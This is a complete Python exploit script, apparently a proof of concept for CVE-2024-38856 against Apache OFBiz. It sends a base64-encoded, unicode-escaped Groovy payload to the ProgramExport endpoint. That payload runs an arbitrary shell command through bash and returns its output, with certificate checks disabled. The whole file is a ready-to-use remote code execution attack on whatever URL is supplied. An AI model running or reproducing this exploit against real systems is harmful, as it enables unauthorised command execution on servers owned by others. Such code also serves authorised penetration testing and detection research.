import base64
import requests
import datetime
import sys

def exploit(url, cmd):
    print("================ \033[1;31mCVE-2024-38856\033[0m ================\n")

    # Base64 encode the command
    b64cmd = base64.b64encode(f"echo [S]; {cmd}; echo [S];".encode()).decode()

    # Create the command to inject
    command = (
        "throw new Exception([\"bash\", \"-c\", "
        "\"{echo," + b64cmd + "}|{base64,-d}|{bash,-i}\"].execute().text);"
    )

    # Convert the command to hexadecimal and format it for the payload
    payload = ''.join([f'\\u00{hex_byte:02x}' for hex_byte in command.encode()])

    # Set up the headers and data for the request
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:122.0) Gecko/20000101 Firefox/123.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"groovyProgram": payload}

    # Send the request
    try:
        response = requests.post(
            f"{url}/webtools/control/main/ProgramExport",
            headers=headers,
            data=data,
            verify=False,  # Don't verify SSL certificates (equivalent to -k in curl)
            timeout=(6, 10)  # Connect timeout and read timeout
        )
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"\033[1;31m[!] Error: {e}\033[0m")
        sys.exit(1)

    # Extract the result between [S] markers
    result = ""
    found = False
    for line in response.text.splitlines():
        if "[S]" in line:
            if not found:
                found = True
            else:
                break
        elif found:
            result += line + "\n"

    # Print the result
    print("\033[1;32m[*]\033[0m", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("\033[1;32m[*]\033[0m Output:\n")
    print(result)
    print("\n")

def main():
    if len(sys.argv) != 3:
        print("\033[1;33m[!] Usage: {} <url> <command>\033[0m".format(sys.argv[0]))
        sys.exit(1)

    url = sys.argv[1]
    cmd = sys.argv[2]
    exploit(url, cmd)

if __name__ == "__main__":
    main()
